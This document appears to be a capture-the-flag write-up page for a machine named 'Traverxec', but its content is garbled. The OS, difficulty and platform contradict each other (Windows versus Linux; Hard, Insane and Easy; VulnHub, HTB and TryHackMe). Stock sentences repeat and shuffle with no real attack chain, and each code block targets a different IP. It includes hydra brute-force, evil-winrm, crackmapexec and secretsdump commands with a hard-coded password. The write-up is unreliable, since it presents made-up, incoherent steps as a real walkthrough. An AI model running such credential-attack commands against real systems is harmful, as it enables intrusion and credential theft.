---
TitleSEO: "VulnHub — Traverxec (Hard Windows) | ZureFX"
TitlePost: "VulnHub — Traverxec (Hard Windows)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Traverxec. CORS Misconfiguration and Weak Service Permissions to achieve hard compromise on Windows."
Keywords: "linux, insane, reversing, active directory, easy, ctf, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-traverxec-889.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-traverxec-889/"
Date: "2024-04-07"
Tags: "Linux, Insane, Reversing, Active Directory, Easy, CTF, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-traverxec-889"
Permalink: "/writeups/htb-traverxec-889.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Traverxec** is rated **Hard** on VulnHub. It runs **Windows** and the IP address during this analysis was `10.47.89.7`.

### Objectives

Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.69.113.169/FUZZ
```

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file.

### Service Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine.

```bash
crackmapexec smb 10.61.217.162 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.89.200.174 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.94.28.6 -u administrator -p 'P@ssw0rd!'
```

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.

### SMB Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files.

```bash
nmap -sCV -p8443,5432,25 10.120.84.169 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.117.122.223 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.218.88
```

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

## Exploitation

### Vulnerability Identification

Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

Key finding: **Constrained Delegation**.

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

### Initial Access

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
nmap -sCV -p587,9200,8080 10.120.212.200 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.83.85.202/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.89.44.64 -u administrator -p 'P@ssw0rd!'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Privilege Escalation

### Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.105.186.251/FUZZ
```

### Exploitation

The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
crackmapexec smb 10.28.115.157 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.192.187 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.46.69.218 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Summary

### Tools Used

- `chisel`
- `hashcat`
- `socat`
- `gobuster`

### Key Takeaways

- CORS Misconfiguration
- Weak Service Permissions
- Constrained Delegation
- XSS
